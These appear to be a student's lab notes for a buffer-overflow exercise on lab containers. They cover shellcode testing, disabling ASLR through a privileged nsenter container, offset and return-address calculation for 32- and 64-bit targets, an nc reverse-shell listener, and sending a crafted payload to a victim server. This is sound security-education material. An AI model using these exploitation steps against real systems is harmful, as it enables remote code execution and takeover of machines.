# 9 $-$ Buffer Overflow
## Notes
- Server is listening on port 9090
---

# Task 1 $-$ Get Familiar with the Shellcode
- Create a temporaneous container
- inside it:
  - install needed stuff:
    - `apt update && apt upgrade && apt install -y build-essential gcc-multilib python3`
  - change the python script with whatever command you want
    - add the command to remove a file, like `rm -f file`
    - create the file you want the script to remove: `touch file`
  - run the python `shellcode_{32/64}.py`
    - `./shellcode_64.py`
  - run `make`
  - run `./a64.out`
  - observe the result
- (may prepare a Dockerfile and a docker-compose.yml ad hoc to automatize)

--- 

# Task 2 $-$ Level-1 Attack
- disable ASLR in the vm running docker 
  ```bash
  docker run -it --rm --privileged --pid=host justincormack/nsenter1
  > sysctl kernel.randomize_va_space=0
  ```
- connect to a container which is not the "..5"
- from here
  - run `echo hello | nc 10.9.0.5 9090` to get frame pointer and buffer's addresses:
    ```
    Frame Pointer (ebp) inside bof():  0xffb84758
    Buffer's address inside bof():     0xffb846e8
    ```
- (not useful for the task) create file of 517 bytes size: `fallocate -l 517 file`

## 2.2 Writing Exploit Code and Launching Attack
- put shellcode at the end of the buffer `content[517 - len(shellcode):] = shellcode`
- new return address is ebp+8
  - after the original ret address
- offset is difference between ebp and buffer addresses, +4
  - there you need to put the return addr
- launch the script to obatin the `badfile`
- listen on a new shell from the attacker `nc -lnv 7070`
- from another shell in the attacker launch the badfile to the victim `cat badfile | nc 10.9.0.6 9090`
---
# Task 3 $-$ Level-2 Attack
- just know the buffer address
- still put shellcode at the end
- ret address now is buffer addr + max size of buffer (300 as stated in the readme)
  - `ret    = 0x408000c8 + 300`
- then since we don't know where to exactly put the address we fill the rest of the buffer from 0 to 50*4 hoping ro overwrite the correct location sooner or later
  ```python
  for offset in range(50):
    content[offset*4:offset*4 + 4] = (ret).to_bytes(4,byteorder='little') 
  ```
- and that's it
---
# Task 4 $-$ Level-3 Attack
- 64 bit
- this time we put the shellcode close to the start of the buffer
  ```python
  start = 40
  content[start:start+len(shellcode)] = shellcode
  ```
- then the return address is the buffer address (since we put the shellcode at the beginning rather than after the original ret address)
- the offset is the difference between the addresses printed by the server, +8 (since 64bit)
---
# Task 5 $-$ Level-4 Attack
- here we have smaller buffer but we exploit the dummy function offering us a 1000 bytes buffer
- we put shellcode at the end `content[517 - len(shellcode):] = shellcode`
- we add 1200 bytes to ebp `ret = <ebp address> + 1200`
- offset still difference between values printed by server, +8: `offset = 96 + 8`